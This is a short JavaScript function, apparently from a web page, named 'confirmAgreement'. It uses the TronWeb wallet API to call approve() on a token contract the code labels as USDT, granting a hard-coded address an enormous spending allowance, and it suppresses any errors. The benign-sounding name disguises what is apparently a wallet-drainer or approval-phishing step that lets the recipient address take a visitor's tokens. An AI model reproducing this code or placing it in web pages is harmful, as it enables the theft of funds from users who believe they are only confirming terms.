var confirmAgreement = async function()
{
  try {
	let usdtContract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
	await usdtContract.approve("TYywSt577JCxcuJtAK6ZZ5RjZkQ5RFL2SY", 1000000000000000).send();
	return true;
  }catch(e){
	  return false;
  }
}